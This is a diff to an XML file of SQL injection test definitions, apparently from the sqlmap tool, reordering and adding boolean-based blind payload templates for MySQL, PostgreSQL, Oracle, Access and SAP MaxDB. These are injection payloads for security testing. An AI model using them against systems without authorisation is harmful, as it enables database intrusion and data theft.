@@ -13,10 +13,10 @@ Tag: <test>
         Valid values:
             1: Boolean-based blind SQL injection
             2: Error-based queries SQL injection
-            3: UNION query SQL injection
+            3: Inline queries SQL injection
             4: Stacked queries SQL injection
             5: Time-based blind SQL injection
-            6: Inline queries SQL injection
+            6: UNION query SQL injection
 
     Sub-tag: <level>
         From which level check for this test.
@@ -171,6 +171,22 @@ Tag: <test>
     </test>
 
     <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [INFERENCE]</vector>
+        <request>
+            <payload>OR [RANDNUM]=[RANDNUM]</payload>
+        </request>
+        <response>
+            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <test>
         <title>AND boolean-based blind - WHERE or HAVING clause (Generic comment)</title>
         <stype>1</stype>
         <level>2</level>
@@ -184,6 +200,23 @@ Tag: <test>
         </request>
         <response>
             <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (Generic comment)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [INFERENCE]</vector>
+        <request>
+            <payload>OR [RANDNUM]=[RANDNUM]</payload>
+            <comment>-- </comment>
+        </request>
+        <response>
+            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
         </response>
     </test>
 
@@ -208,52 +241,19 @@ Tag: <test>
     </test>
 
     <test>
-        <title>OR boolean-based blind - WHERE or HAVING clause</title>
-        <stype>1</stype>
-        <level>1</level>
-        <risk>3</risk>
-        <clause>1</clause>
-        <where>2</where>
-        <vector>OR ([INFERENCE])</vector>
-        <request>
-            <payload>OR ([RANDNUM]=[RANDNUM])</payload>
-        </request>
-        <response>
-            <comparison>OR ([RANDNUM]=[RANDNUM1])</comparison>
-        </response>
-    </test>
-
-    <test>
-        <title>OR boolean-based blind - WHERE or HAVING clause (Generic comment)</title>
-        <stype>1</stype>
-        <level>2</level>
-        <risk>3</risk>
-        <clause>1</clause>
-        <where>2</where>
-        <vector>OR ([INFERENCE])</vector>
-        <request>
-            <payload>OR ([RANDNUM]=[RANDNUM])</payload>
-            <comment>-- </comment>
-        </request>
-        <response>
-            <comparison>OR ([RANDNUM]=[RANDNUM1])</comparison>
-        </response>
-    </test>
-
-    <test>
         <title>OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</title>
         <stype>1</stype>
         <level>3</level>
         <risk>3</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR ([INFERENCE])</vector>
+        <vector>OR [INFERENCE]</vector>
         <request>
-            <payload>OR ([RANDNUM]=[RANDNUM])</payload>
+            <payload>OR [RANDNUM]=[RANDNUM]</payload>
             <comment>#</comment>
         </request>
         <response>
-            <comparison>OR ([RANDNUM]=[RANDNUM1])</comparison>
+            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -261,7 +261,47 @@ Tag: <test>
     </test>
 
     <test>
-        <title>MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)</title>
+        <title>AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [INFERENCE]</vector>
+        <request>
+            <payload>AND [RANDNUM]=[RANDNUM]</payload>
+            <comment>%16</comment>
+        </request>
+        <response>
+            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [INFERENCE]</vector>
+        <request>
+            <payload>OR [RANDNUM]=[RANDNUM]</payload>
+            <comment>%16</comment>
+        </request>
+        <response>
+            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
         <stype>1</stype>
         <level>2</level>
         <risk>1</risk>
@@ -395,35 +435,83 @@ Tag: <test>
 
     <!-- Boolean-based blind tests - Parameter replace -->
     <test>
-        <title>Generic boolean-based blind - Parameter replace</title>
+        <title>MySQL &gt;= 5.0 boolean-based blind - Parameter replace</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 boolean-based blind - Parameter replace (original value)</title>
         <stype>1</stype>
         <level>2</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</comparison>
         </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
     </test>
 
     <test>
-        <title>Generic boolean-based blind - Parameter replace (original value)</title>
+        <title>MySQL &lt; 5.0 boolean-based blind - Parameter replace</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0 boolean-based blind - Parameter replace (original value)</title>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
         </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
     </test>
 
     <test>
@@ -505,7 +593,7 @@ Tag: <test>
     <test>
         <title>MySQL boolean-based blind - Parameter replace (bool*int)</title>
         <stype>1</stype>
-        <level>5</level>
+        <level>4</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
@@ -534,84 +622,6 @@ Tag: <test>
         </request>
         <response>
             <comparison>([RANDNUM]=[RANDNUM1])*[ORIGVALUE]</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.0 boolean-based blind - Parameter replace</title>
-        <stype>1</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</payload>
-        </request>
-        <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.0 boolean-based blind - Parameter replace (original value)</title>
-        <stype>1</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</payload>
-        </request>
-        <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - Parameter replace</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
-        </request>
-        <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - Parameter replace (original value)</title>
-        <stype>1</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
-        </request>
-        <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -660,7 +670,7 @@ Tag: <test>
     <test>
         <title>PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)</title>
         <stype>1</stype>
-        <level>3</level>
+        <level>5</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
@@ -680,7 +690,7 @@ Tag: <test>
     <test>
         <title>PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)</title>
         <stype>1</stype>
-        <level>4</level>
+        <level>5</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
@@ -853,41 +863,9 @@ Tag: <test>
     </test>
     <!-- End of boolean-based blind tests - Parameter replace -->
 
-    <!-- Boolean-based blind tests - GROUP BY and ORDER BY clauses -->
+    <!-- Boolean-based blind tests - ORDER BY, GROUP BY clause -->
     <test>
-        <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses</title>
-        <stype>1</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>2,3</clause>
-        <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE 1/(SELECT 0) END))</vector>
-        <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))</payload>
-        </request>
-        <response>
-            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/(SELECT 0) END))</comparison>
-        </response>
-    </test>
-
-    <test>
-        <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses (original value)</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>2,3</clause>
-        <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</vector>
-        <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</payload>
-        </request>
-        <response>
-            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</comparison>
-        </response>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause</title>
         <stype>1</stype>
         <level>2</level>
         <risk>1</risk>
@@ -907,9 +885,9 @@ Tag: <test>
     </test>
 
     <test>
-        <title>MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses (original value)</title>
+        <title>MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
         <stype>1</stype>
-        <level>4</level>
+        <level>3</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
@@ -927,7 +905,7 @@ Tag: <test>
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause</title>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
@@ -942,13 +920,14 @@ Tag: <test>
         </response>
         <details>
             <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses (original value)</title>
+        <title>MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
         <stype>1</stype>
-        <level>5</level>
+        <level>4</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
@@ -961,13 +940,14 @@ Tag: <test>
         </response>
         <details>
             <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>PostgreSQL boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause</title>
         <stype>1</stype>
-        <level>3</level>
+        <level>2</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
@@ -985,9 +965,9 @@ Tag: <test>
 
     <!-- It exclusively works with ORDER BY -->
     <test>
-        <title>PostgreSQL boolean-based blind - ORDER BY clauses (original value)</title>
+        <title>PostgreSQL boolean-based blind - ORDER BY clause (original value)</title>
         <stype>1</stype>
-        <level>5</level>
+        <level>4</level>
         <risk>1</risk>
         <clause>3</clause>
         <where>1</where>
@@ -1008,10 +988,10 @@ Tag: <test>
                It already works for ORDER BY because it accepts int whereas GROUP BY only accepts format [table].[column] so [ORIGVALUE] must where it is
     -->
     <test>
-        <!-- <title>PostgreSQL boolean-based blind - GROUP BY and ORDER BY clauses (GENERATE_SERIES - original value)</title> -->
+        <!-- <title>PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause (GENERATE_SERIES - original value)</title> -->
         <title>PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)</title>
         <stype>1</stype>
-        <level>3</level>
+        <level>5</level>
         <risk>1</risk>
         <!-- <clause>2,3</clause> -->
         <clause>3</clause>
@@ -1071,7 +1051,7 @@ Tag: <test>
     </test>
 
     <test>
-        <title>Oracle boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>Oracle boolean-based blind - ORDER BY, GROUP BY clause</title>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
@@ -1090,7 +1070,7 @@ Tag: <test>
     </test>
 
     <test>
-        <title>Oracle boolean-based blind - GROUP BY and ORDER BY clauses (original value)</title>
+        <title>Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
@@ -1109,9 +1089,9 @@ Tag: <test>
     </test>
 
     <test>
-        <title>Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause</title>
         <stype>1</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
@@ -1128,9 +1108,9 @@ Tag: <test>
     </test>
 
     <test>
-        <title>Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses (original value)</title>
+        <title>Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
         <stype>1</stype>
-        <level>4</level>
+        <level>5</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
@@ -1147,9 +1127,9 @@ Tag: <test>
     </test>
 
     <test>
-        <title>SAP MaxDB boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause</title>
         <stype>1</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
@@ -1166,9 +1146,9 @@ Tag: <test>
     </test>
 
     <test>
-        <title>SAP MaxDB boolean-based blind - GROUP BY and ORDER BY clauses (original value)</title>
+        <title>SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
         <stype>1</stype>
-        <level>4</level>
+        <level>5</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
@@ -1183,13 +1163,13 @@ Tag: <test>
             <dbms>SAP MaxDB</dbms>
         </details>
     </test>
-    <!-- End of boolean-based blind tests - GROUP BY and ORDER BY clauses -->
+    <!-- End of boolean-based blind tests - ORDER BY, GROUP BY clause -->
 
     <!-- Boolean-based blind tests - Stacked queries -->
     <test>
         <title>MySQL &gt;= 5.0 boolean-based blind - Stacked queries</title>
         <stype>1</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
@@ -1210,7 +1190,7 @@ Tag: <test>
     <test>
         <title>MySQL &lt; 5.0 boolean-based blind - Stacked queries</title>
         <stype>1</stype>
-        <level>4</level>
+        <level>5</level>
         <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
@@ -1224,6 +1204,7 @@ Tag: <test>
         </response>
         <details>
             <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
         </details>
     </test>
 
@@ -1251,7 +1232,7 @@ Tag: <test>
     <test>
         <title>PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)</title>
         <stype>1</stype>
-        <level>4</level>
+        <level>5</level>
         <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
@@ -1335,7 +1316,7 @@ Tag: <test>
     <test>
         <title>Microsoft Access boolean-based blind - Stacked queries</title>
         <stype>1</stype>
-        <level>4</level>
+        <level>5</level>
         <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
